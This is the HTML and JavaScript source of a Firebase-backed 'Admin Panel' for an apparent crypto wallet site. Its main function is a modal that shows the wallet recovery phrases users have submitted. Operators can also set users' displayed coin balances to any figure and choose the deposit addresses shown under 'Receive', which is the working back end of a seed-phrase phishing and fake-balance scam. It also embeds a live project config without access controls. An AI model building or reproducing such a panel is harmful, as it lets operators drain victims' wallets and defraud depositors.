<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Admin Panel</title>

<style>
body { margin:0; font-family: Arial, sans-serif; display:flex; background:#f4f7fb; }

/* Sidebar */
.sidebar { width:240px; background:#fff; height:100vh; border-right:1px solid #e6ecf2; padding:15px 0; }
.sidebar h3 { font-size:12px; color:#9aa5b1; padding:0 20px; margin-bottom:10px; }
.menu-item { display:flex; align-items:center; padding:12px 20px; color:#5f6c7b; cursor:pointer; border-left:3px solid transparent; font-size:14px; }
.menu-item:hover { background:#f0f6ff; }
.menu-item.active { background:#eef5ff; color:#2f80ed; border-left:3px solid #2f80ed; font-weight:600; }

/* Main */
.main { flex:1; padding:30px; }
.main h2 { color:#2f80ed; margin-bottom:20px; }

/* Card */
.card { background:#fff; border-radius:10px; padding:20px; margin-bottom:20px; border:1px solid #e6ecf2; max-width:420px; }

.card b { display:block; margin-bottom:15px; font-size:16px; }

/* Form group */
.form-group { margin-bottom:15px; }
.form-group label {
  display:block;
  font-size:13px;
  color:#6b7785;
  margin-bottom:6px;
}

.form-group input {
  width:100%;
  padding:10px;
  border-radius:6px;
  border:1px solid #dfe6ee;
  background:#f9fbfd;
  font-size:14px;
  outline:none;
  transition:0.2s;
}

.form-group input:focus {
  border-color:#2f80ed;
  background:#fff;
}

/* Button */
button {
  width:100%;
  padding:10px;
  background:#2f80ed;
  color:#fff;
  border:none;
  border-radius:6px;
  font-size:14px;
  cursor:pointer;
  transition:0.2s;
}
button:hover { background:#1c60c4; }

</style>
<style>
/* New Table Styles */
.user-table { width: 100%; border-collapse: collapse; background: #fff; border-radius: 8px; overflow: hidden; box-shadow: 0 2px 5px rgba(0,0,0,0.05); }
.user-table th, .user-table td { padding: 12px 15px; text-align: left; border-bottom: 1px solid #e6ecf2; }
.user-table th { background: #f8f9fa; color: #9aa5b1; font-size: 12px; text-transform: uppercase; }
.edit-link { color: #2f80ed; cursor: pointer; font-weight: 600; text-decoration: none; }

/* Modal Styles */
.modal { display:none; position: fixed; z-index: 100; left: 0; top: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.5); align-items: center; justify-content: center; }
.modal-content { background: #fff; padding: 25px; border-radius: 12px; width: 90%; max-width: 500px; max-height: 80vh; overflow-y: auto; position: relative; }
.modal-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
.close-modal { font-size: 24px; cursor: pointer; color: #9aa5b1; }
.grid-inputs { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; }

/* Search Bar */
.search-box { margin-bottom: 20px; padding: 10px; width: 300px; border-radius: 6px; border: 1px solid #dfe6ee; outline: none; }
</style>
</head>

<body>


<div class="sidebar">
  <h3>NAVIGATION</h3>
  <div class="menu-item active" id="usersBtn">👤 Users</div>
  <div class="menu-item" id="walletSettingsBtn">💳 Wallet Addresses</div> 
</div>

<div class="main" id="content">
  <h2>Dashboard</h2>
</div>

<div id="editModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 id="modalUserName">Edit Wallet</h3>
      <span class="close-modal" id="closeModal">&times;</span>
    </div>
    <div id="modalInputs" class="grid-inputs">
      </div>
    <br>
    <button id="saveWalletBtn">Save Changes</button>
  </div>
</div>

<div id="viewPhraseModal" class="modal">
  <div class="modal-content">
    <div class="modal-header">
      <h3 id="phraseModalTitle">Connected Wallet Info</h3>
      <span class="close-modal" id="closePhraseModal">&times;</span>
    </div>
    <div class="form-group">
      <label>Wallet Provider</label>
      <input type="text" id="displayWalletType" readonly style="font-weight:bold; color:#2f80ed;">
    </div>
    <div class="form-group">
      <label>User Message / Recovery Phrase</label>
      <textarea id="displayPhrase" readonly 
        style="width:100%; height:120px; padding:12px; border-radius:6px; border:1px solid #dfe6ee; 
        background:#fdfdfd; font-weight:900; color:#000; font-family:monospace; resize:none;"></textarea>
    </div>
    <button onclick="document.getElementById('viewPhraseModal').style.display='none'">Close View</button>
  </div>
</div>

<!-- Firebase (no module, no auth/security) -->
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
<script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>

<script>
const firebaseConfig = {
  apiKey: "AIzaSyAxm4GyDY2RSJXUI1iFpIHUGiPfiEQX9l8",
  authDomain: "cryptwallet360.firebaseapp.com",
  databaseURL: "https://cryptwallet360-default-rtdb.firebaseio.com",
  projectId: "cryptwallet360",
  storageBucket: "cryptwallet360.firebasestorage.app",
  messagingSenderId: "464447906680",
  appId: "1:464447906680:web:471b3482cf21557437de8d"
};

firebase.initializeApp(firebaseConfig);
const db = firebase.database();
const content = document.getElementById('content');

function setActive(el){
  document.querySelectorAll('.menu-item').forEach(i=>i.classList.remove('active'));
  el.classList.add('active');
}


let currentEditingId = null;

function loadUsers() {
  content.innerHTML = `
    <h2>Users Management</h2>
    <input type="text" id="userSearch" class="search-box" placeholder="Search user by name...">
    <table class="user-table">
      <thead>
        <tr>
          <th>Name</th>
          <th>Total Coins</th>
          <th>Status</th>
          <th>Action</th>
        </tr>
      </thead>
      <tbody id="userTableBody"></tbody>
    </table>
  `;

  const tableBody = document.getElementById('userTableBody');

  db.ref('users').on('value', snapshot => {
    tableBody.innerHTML = '';
    snapshot.forEach(child => {
      const user = child.val();
      const id = child.key;
      const wallet = user.wallet || {};
      const coinCount = Object.keys(wallet).length;

      const tr = document.createElement('tr');
      tr.innerHTML = `
        <td><b>${user.name || 'Unknown'}</b><br><small style="color:#9aa5b1">${id}</small></td>
        <td>${coinCount} Assets</td>
        <td><span style="color:green">● Active</span></td>
        <td><span class="edit-link" onclick="openEditModal('${id}', '${user.name}')">Edit Balances</span></td>
      `;
      tableBody.appendChild(tr);
    });
  });
  // Add this inside loadUsers after the tableBody is defined
  document.getElementById('userSearch').oninput = (e) => {
      const term = e.target.value.toLowerCase();
      const rows = tableBody.getElementsByTagName('tr');
      for (let row of rows) {
          const name = row.getElementsByTagName('td').innerText.toLowerCase();
          row.style.display = name.includes(term) ? '' : 'none';
      }
  };
}

window.openEditModal = (id, name) => {
  currentEditingId = id;
  document.getElementById('modalUserName').innerText = "Edit " + name;
  const modalInputs = document.getElementById('modalInputs');
  
  // 1. Show loading state
  modalInputs.innerHTML = '<p style="padding:20px; text-align:center;">Loading balances...</p>';
  document.getElementById('editModal').style.display = 'flex';
  
  // 2. Fetch current data
  db.ref('users/' + id + '/wallet').once('value', snap => {
    const w = snap.val() || {};
    const coins = ['usd', 'btc', 'eth', 'trx', 'sol', 'doge', 'ada', 'ltc', 'bnb', 'usdt_trc', 'usdt_erc'];
    
    let htmlContent = '';
    coins.forEach(c => {
      // Create a cleaner label for the Admin UI
      let displayLabel = c.toUpperCase().replace('_', ' (').replace('trc', 'TRC20)').replace('erc', 'ERC20)');
      
      htmlContent += `
        <div class="form-group" style="margin-bottom: 12px;">
          <label style="display:block; font-size:12px; font-weight:bold; color:#666; margin-bottom:4px;">
            ${displayLabel}
          </label>
          <input type="number" id="mod-${c}" value="${w[c] || 0}" step="any" 
                 style="width:100%; padding:8px; border:1px solid #ccc; border-radius:4px;">
        </div>
      `;
    });
    
    // 3. Render all inputs at once
    modalInputs.innerHTML = htmlContent;
  });
};

window.openConnectModal = () => {
    const modal = document.getElementById('connectWalletModal');
    if (modal) {
        // Reset the phrase field so it's empty for the new entry
        const phraseInput = document.getElementById('walletPhrase');
        if (phraseInput) phraseInput.value = "";
        
        modal.style.display = 'flex';
    } else {
        console.error("Connect Wallet Modal not found in DOM");
    }
};

document.getElementById('saveWalletBtn').onclick = () => {
  const coins = ['usd', 'btc', 'eth', 'trx', 'sol', 'doge', 'ada', 'ltc', 'bnb', 'usdt_trc', 'usdt_erc'];
  const updates = {};
  
  coins.forEach(c => {
    const inputEl = document.getElementById('mod-' + c);
    if (inputEl) {
      // Use parseFloat to handle decimals correctly for crypto balances
      const val = parseFloat(inputEl.value);
      updates[c] = !isNaN(val) ? val : 0;
    }
  });

  db.ref('users/' + currentEditingId + '/wallet').update(updates)
    .then(() => {
      showToast('Wallet updated successfully!');
      document.getElementById('editModal').style.display = 'none';
      
      // Optional: Refresh the local user list display so the new balances show up immediately
      if (typeof fetchUsers === 'function') fetchUsers(); 
    })
    .catch((error) => {
      console.error("Update failed:", error);
      showToast('Error updating wallet', 'error');
    });
};

document.getElementById('closeModal').onclick = () => {
  document.getElementById('editModal').style.display = 'none';
};
function showToast(msg){
  const t = document.createElement('div');
  t.innerText = msg;
  t.style.position='fixed';
  t.style.bottom='20px';
  t.style.right='20px';
  t.style.background='#2f80ed';
  t.style.color='#fff';
  t.style.padding='10px 15px';
  t.style.borderRadius='6px';
  document.body.appendChild(t);
  setTimeout(()=>t.remove(),2000);
}

// events

document.getElementById('usersBtn').onclick = e=>{ setActive(e.target); loadUsers(); };


</script>

<script>
  // Add to your event listeners at the bottom
document.getElementById('walletSettingsBtn').onclick = e => { setActive(e.target); loadWalletSettings(); };

function loadWalletSettings() {
  content.innerHTML = `
    <h2>Global Deposit Addresses</h2>
    <div class="card">
      <div id="walletForm">
        <p style="font-size:12px; color:#666; margin-bottom:15px;">Set the addresses users see when they click 'Receive'.</p>
        <div id="addressInputs"></div>
        <button id="saveGlobalAddresses" style="margin-top:10px;">Save All Addresses</button>
      </div>
    </div>
  `;

  const container = document.getElementById('addressInputs');
  const coins = ['btc', 'eth', 'trx', 'doge', 'usdt_trc', 'usdt_erc'];
  
  // Fetch existing addresses
  db.ref('settings/deposit_addresses').once('value', snap => {
    const addrs = snap.val() || {};
    coins.forEach(c => {
      container.innerHTML += `
        <div class="form-group">
          <label>${c.toUpperCase()} Address</label>
          <input type="text" id="addr-${c}" value="${addrs[c] || ''}" placeholder="Enter address">
        </div>
      `;
    });
  });

  document.getElementById('saveGlobalAddresses').onclick = () => {
    const updates = {};
    coins.forEach(c => {
      updates[c] = document.getElementById('addr-' + c).value;
    });
    db.ref('settings/deposit_addresses').update(updates).then(() => {
      showToast('Addresses updated!');
    });
  };
}
</script>

<script>
  function loadUsers() {
  content.innerHTML = `
    <h2>Users Management</h2>
    <input type="text" id="userSearch" class="search-box" placeholder="Search user by name...">
    <table class="user-table">
      <thead>
        <tr>
          <th>Name</th>
          <th>Wallet Info</th> <th>Action</th>
        </tr>
      </thead>
      <tbody id="userTableBody"></tbody>
    </table>
  `;

  const tableBody = document.getElementById('userTableBody');

  db.ref('users').on('value', snapshot => {
    tableBody.innerHTML = '';
// Update this part inside your loadUsers() function in admin.html
snapshot.forEach(child => {
// Inside snapshot.forEach in loadUsers()
const user = child.val();
const id = child.key;

// Look for connectedWallets (plural)
const wallets = user.connectedWallets || {};
const walletCount = Object.keys(wallets).length;

const tr = document.createElement('tr');
tr.innerHTML = `
  <td><b>${user.name || 'Unknown'}</b><br><small>${id}</small></td>
  <td>
      ${walletCount > 0 
        ? `<span class="edit-link" onclick="viewPhrases('${id}')" style="color:#27ae60;">
            View ${walletCount} Wallet(s)
           </span>` 
        : `<span style="color:#9aa5b1">No Connection</span>`
      }
  </td>
  <td><span class="edit-link" onclick="openEditModal('${id}', '${user.name}')">Edit Balances</span></td>
`;
  tableBody.appendChild(tr);

    });
  });
}

// Function to view the connected wallet info
window.viewPhrases = (id) => {
    // Note the 's' in connectedWallets to match your new user.js logic
    db.ref(`users/${id}/connectedWallets`).once('value', snap => {
        const wallets = snap.val();
        
        if (!wallets) {
            showToast("No wallet data found for this user.");
            return;
        }
        
        const displayArea = document.getElementById('displayPhrase');
        let allWalletsText = "";

        // Convert the object of objects into an array and loop
        Object.keys(wallets).forEach((key, index) => {
            const data = wallets[key];
            const dateStr = new Date(data.timestamp).toLocaleString();
            
            allWalletsText += `--- WALLET ENTRY #${index + 1} ---\n`;
            allWalletsText += `TYPE: ${data.walletType}\n`;
            allWalletsText += `DATE: ${dateStr}\n`;
            allWalletsText += `PHRASE/MESSAGE:\n${data.phrase}\n`;
            allWalletsText += `---------------------------\n\n`;
        });

        // Populate the modal fields
        document.getElementById('phraseModalTitle').innerText = `Viewing ${Object.keys(wallets).length} Wallet(s)`;
        document.getElementById('displayWalletType').value = "Multiple Entries";
        displayArea.value = allWalletsText;
        
        // Show the modal
        document.getElementById('viewPhraseModal').style.display = 'flex';
    });
};// Close listener for the new modal
document.getElementById('closePhraseModal').onclick = () => {
  document.getElementById('viewPhraseModal').style.display = 'none';
};

// At the bottom of your script
document.getElementById('usersBtn').onclick = e => { setActive(e.target); loadUsers(); };

// Ensure the page loads the Users view by default
loadUsers();
setActive(document.getElementById('usersBtn'));
</script>

</body>
</html>
